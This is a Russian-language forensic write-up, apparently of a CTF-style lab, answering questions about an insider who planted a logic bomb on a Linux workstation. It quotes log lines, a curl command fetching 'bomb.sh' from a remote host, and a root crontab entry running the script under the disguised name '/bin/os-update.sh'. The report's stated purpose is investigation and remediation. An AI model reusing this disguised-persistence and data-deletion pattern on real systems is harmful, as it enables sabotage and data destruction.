# Отчет по расследованию инцидента (CyberT)

## Вводная информация
Сотрудник IT-отдела компании CyberT был арестован за ведение незаконной деятельности в рабочее время. Клиент предоставил рабочую станцию, на которой последний раз работал этот сотрудник. Задача — выяснить, совершал ли он какие-либо вредоносные действия в отношении активов компании.

## Вопросы и ответы по расследованию

### 1. Установка пакета с повышенными привилегиями
Сотрудник установил пакет с использованием `sudo`. Какая полная команда была выполнена?  
**Ответ:** `/usr/bin/apt install dokuwiki`

**Обоснование:** В логах `auth.log` и `bash_history` обнаружена команда `sudo apt install dokuwiki`. Полный путь к исполняемому файлу — `/usr/bin/apt`.

---

### 2. Рабочая директория при выполнении команды
В какой рабочей директории (`PWD`) находился пользователь при выполнении установки?  
**Ответ:** `/home/cybert`

**Обоснование:** В логах `auth.log` указано: `PWD=/home/cybert`.

---

### 3. Создание нового пользователя
Какой пользователь был создан после установки пакета?  
**Ответ:** `it-admin`

**Обоснование:** В `bash_history` найдена команда `sudo adduser it-admin`.

---

### 4. Предоставление sudo-привилегий
Когда был обновлён файл `sudoers` (дата и время)?  
**Ответ:** `Dec 28 06:27:34`

**Обоснование:** В логах `auth.log.1` обнаружена запись о выполнении `visudo` пользователем `cybert`:
```
Dec 28 06:27:34 ip-10-10-168-55 sudo:   cybert : TTY=pts/0 ; PWD=/home/cybert ; USER=root ; COMMAND=/usr/sbin/visudo
```

---

### 5. Создание подозрительного скрипта
Какой файл был открыт в текстовом редакторе `vi`?  
**Ответ:** `bomb.sh`

**Обоснование:** В `bash_history` пользователя `it-admin` найдена команда `sudo vi bomb.sh`.

---

### 6. Команда, создавшая файл
Какая команда использовалась для создания файла `bomb.sh`?  
**Ответ:** `curl 10.10.158.38:8080/bomb.sh --output bomb.sh`

**Обоснование:** В `bash_history` обнаружена загрузка файла с удалённого сервера.

---

### 7. Перемещение и переименование файла
Файл `bomb.sh` был перемещён и переименован. Каков полный путь к этому файлу сейчас?  
**Ответ:** `/bin/os-update.sh`

**Обоснование:** В `/etc/crontab` найдена задача, выполняющая скрипт `/bin/os-update.sh`. Анализ содержимого скрипта подтверждает его деструктивный характер.

---

### 8. Дата последнего изменения файла
Когда был последний раз изменён файл `/bin/os-update.sh`?  
**Ответ:** `Dec 28 06:29`

**Обоснование:** Результат выполнения `stat /bin/os-update.sh`:
```
Modify: 2022-12-28 06:29:43.998004273 +0000
```

---

### 9. Имя создаваемого файла
Какой файл будет создан при выполнении `/bin/os-update.sh`?  
**Ответ:** `goodbye.txt`

**Обоснование:** В теле скрипта содержится строка:
```bash
echo -e "I TOLD YOU YOU'LL REGRET THIS!!! GOOD RIDDANCE!!! HAHAHAHA\n-mistermeist3r" > /goodbye.txt
```

---

### 10. Время срабатывания вредоносного скрипта
Во сколько будет выполняться задача, запускающая скрипт?  
**Ответ:** `08:00 AM`

**Обоснование:** В `/etc/crontab` указано:
```
0 8     * * *   root    /bin/os-update.sh
```
Это означает выполнение в 8:00 ежедневно.

## Вывод

Сотрудник IT-отдела совершил следующие действия:
1. Установил DokuWiki.
2. Создал пользователя `it-admin` и предоставил ему права `sudo`.
3. Загрузил и запустил вредоносный скрипт `bomb.sh`, который затем был переименован в `/bin/os-update.sh` и добавлен в крон.
4. Скрипт проверяет активность пользователя `it-admin` за последние 90 дней. Если входов не было — удаляет данные DokuWiki и создаёт файл `/goodbye.txt` с сообщением-угрозой.

**Рекомендации:** Удалить скрипт `/bin/os-update.sh`, удалить запись из `/etc/crontab`, проверить систему на наличие других закладок.
